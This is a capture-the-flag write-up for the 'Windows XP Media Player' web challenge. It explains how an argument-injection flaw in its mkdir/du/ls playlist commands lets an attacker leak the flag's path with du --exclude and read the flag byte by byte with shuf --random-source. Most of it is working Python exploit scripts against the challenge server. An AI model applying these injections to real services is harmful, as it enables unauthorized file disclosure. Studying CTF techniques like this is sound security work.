# Windows XP Media Player (web, 810p, 5 solves)

Windows XP Media Player is a web challenge.
It has a nice Windows XP interface.
The flag is stored on the filesystem, in `/flag/<rand_hash>/<rand_hash>`

The API allows to create, shuffle and skip a song from the music queue.
It also allows to create, show and display statistics about playlists.

Internally, the playlists operations uses unix commands from the GNU binutils tools:
- create : mkdir {args}
- stat : dh -sh {args}
- show : ls -A {args}

These commands are vulnerable to argument injections.
All arguments must be real files: a file has to be created for every injected argument.

The following script leaks the full path of the flag, character by character, by using `du --exclude`
```python
import requests, re, sys

HOST = 'http://windows-xp-media-player.balsnctf.com'

s = requests.Session()
cookie_obj = requests.cookies.create_cookie(domain='windows-xp-media-player.balsnctf.com',name='session',value='...')
s.cookies.set_cookie(cookie_obj)

res = s.get(HOST)

prefix = sys.argv[1]
username = re.search('User: ([^<]*)<', res.text)[1]

while True:
    for c in '0123456789abcdef':
        res = s.get(HOST + '/q/add', params = {
            'args': f'--hide --output=/sandbox/{username}/--exclude={prefix}{c}*',
        })

        res = s.get(HOST + '/q/skip')

        res = s.get(HOST + '/q/add', params = {
            'args': '/flag',
        })

        res = s.get(HOST + '/q/shuf')

        res = s.get(HOST, params = {
            'args': f'--files0-from=zzzzz --exclude={prefix}{c}*',
            'op': 'stat'
        })
        print(prefix + c, len(res.text), res.text.split('\n')[58])

        if '8.0K' in res.text.split('\n')[58]: # or '12K'
            prefix += c
            break    
```

The path is located at `/flag/f176872c644795fd45b6719f8723ca90/368f097864ce90340ef141da53983e4b`

Reading the flag can be done with `shuf --random-source=/flag/... -n$x`
This command will shuffle deterministically the `$x` first lines of the standard input.
If the input has 256 lines, it will first read a byte `b` from the entropy source file, and print the `b`th line.

The following proof-of-concept will print the content of a local file named `a`:
```python
#!/usr/bin/env python
from subprocess import check_output

state = [f"{x:02x}" for x in range(0x100)]
cstate = [f"{x:02x}" for x in range(0x100)]

def shuf(n):
    return (
        check_output(["shuf", "-e", *state, "--random-source=a", "-n", str(n),])
        .strip()
        .decode()
    )


def swap(x, y):
    cstate[x], cstate[y] = cstate[y], cstate[x]


for i in range(100):
    # r = last line of shuf
    r = shuf(i + 1).split("\n")[-1]
    r = cstate.index(r) - i
    print(chr(r))
    swap(i, i+r)

```



Finally, the following code leaks the flag content from the remote server.
The whole execution takes around 15-20 minutes :
```python
#!/usr/bin/env python
from bitk import BurpSession
from bs4 import BeautifulSoup
from tqdm import tqdm
import re


s = BurpSession()
ROOT = "http://windows-xp-media-player.balsnctf.com"
#ROOT = "http://127.0.0.1"


def get(path, *args, **kwargs):
    return s.get(f"{ROOT}{path}", *args, **kwargs)


def create(args):
    params = {"args": args, "op": "create"}
    return get(f"/", params=params).text


def show(args):
    params = {"args": args, "op": "show"}
    return get(f"/", params=params).text


def stat(args):
    params = {"args": args, "op": "stat"}
    return get(f"/", params=params).text


def add(args):
    params = {"args": args}
    return get("/q/add", params=params).text


def shuf():
    r = get("/q/shuf")
    if r.status_code == 200:
        return r.text
    return get("/").text


def skip():
    return get("/q/skip").text


def get_user_id(html):
    return re.findall(r"User: ([a-f0-9]+)", html)[0]


def print_show_output(html):
    soup = BeautifulSoup(html, "html.parser")
    divs = soup.select(".field-row>label")
    out = []
    for d in divs:
        out.append(d.contents[0] if d.contents else "")
    return out


def create_args(*args):
    return "\n".join(f"XX{arg}" for arg in args)


def create_file(user, filename):
    add(f"--hide --output=/sandbox/{user}/{filename}")
    skip()
    shuf()
    skip()


html = create("-p ./--random-source=/flag/f176872c644795fd45b6719f8723ca90/368f097864ce90340ef141da53983e4b")
user = get_user_id(html)
create_file(user, f"-n")
for i in tqdm(range(256)):
    create_file(user, f"{i}")




state = [f"{x}" for x in range(256)]
cstate = [f"{x}" for x in range(256)]

def swap(x, y):
    cstate[x], cstate[y] = cstate[y], cstate[x]

for i in range(100):
    add("--hide --random-source=/flag/f176872c644795fd45b6719f8723ca90/368f097864ce90340ef141da53983e4b -n " + str(i+1) + " " + " ".join(state))
    skip()
    r = shuf()
    r = print_show_output(r)
    r = r[i]
    r = cstate.index(r) - i
    print(chr(r))
    swap(i, i+r)
    for _ in range(i+1):
        skip()
```